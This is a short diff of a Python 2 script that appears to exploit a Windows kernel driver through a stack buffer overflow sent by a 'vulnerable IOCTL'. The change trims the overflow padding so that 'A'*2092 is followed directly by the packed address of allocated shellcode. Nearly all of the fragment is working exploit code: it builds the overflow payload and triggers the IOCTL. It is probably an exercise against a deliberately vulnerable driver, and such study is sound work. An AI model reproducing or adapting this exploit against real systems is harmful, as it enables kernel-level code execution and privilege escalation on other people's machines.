@@ -167,7 +167,7 @@ def ctl_code(function,
 ### Create buffer and send IOCRL ###
 def trigger(hDevice, dwIoControlCode, scAllocateShell):
 
-    shellz = create_string_buffer("A"*2092 + "B"*4 + struct.pack("<L", scAllocateShell))
+    shellz = create_string_buffer("A"*2092 + struct.pack("<L", scAllocateShell))
     print "[*]Triggering vulnerable IOCTL...[*]"
     lpInBuffer = addressof(shellz)
     nInBufferSize = len(shellz)
